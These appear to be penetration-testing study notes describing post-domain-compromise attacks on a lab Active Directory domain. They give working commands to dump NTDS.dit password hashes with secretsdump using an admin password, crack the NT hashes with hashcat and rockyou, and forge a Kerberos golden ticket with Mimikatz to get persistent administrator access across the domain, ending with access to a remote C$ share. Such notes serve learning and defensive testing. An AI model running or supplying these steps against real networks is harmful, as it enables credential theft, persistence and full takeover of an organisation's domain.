## Post-Domain Compromise Attack Strategy

- Dump NTDS.dit and crack password
- Create DA account to gain persistence and /or create a golden ticket


## Dumping the NTDS.dit

What is NTDS.dit ? A databse used to store the AD data including :
- User/group information
- Security descriptors
- Password hashes

We can use secretsdump on this domain using a known admin account :
secretsdump.py MARVEL.local/hawkeye:'Password1'@192.168.138.132 -just-dc-ntlm

From the hashes all we want to crack is the NT part of the hash, not the lm. Explain with NT hash is more valuable in domain attacking context

Now  extract NT hash, can use Excel to split using delimeter
Copy list in a text file

hashcat -m 1000 ntds.txt /usr/share/wordlist/rockyou.txt

## Golden Ticket Attacks Overview

When we compromise the krbtgt account we own the domain
We can request access to any resource or system on the domain

Using Mimikatz in privilege debug
privilege::debug 
We can attack to get a Golden ticket giving us access to the whole domain

## Golden Ticket Attacks

mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt //copy domain SID and NTLM hash of primary krbtgt account
kerberos::golden /User:Administrator /domain:marvel.local /sid:XXXXXXXX /krbtgt:NTLM_HASH /id:500 /ptt //Here does not have to be a real user, id 500 is reserved for admin accound id; ptt = pass the ticket to the next session
//Ticket is valid for current session, so we start a cmd from that session
misc::cmd

And try to list remote machine from it:
dir \\THEPUNISHER\c$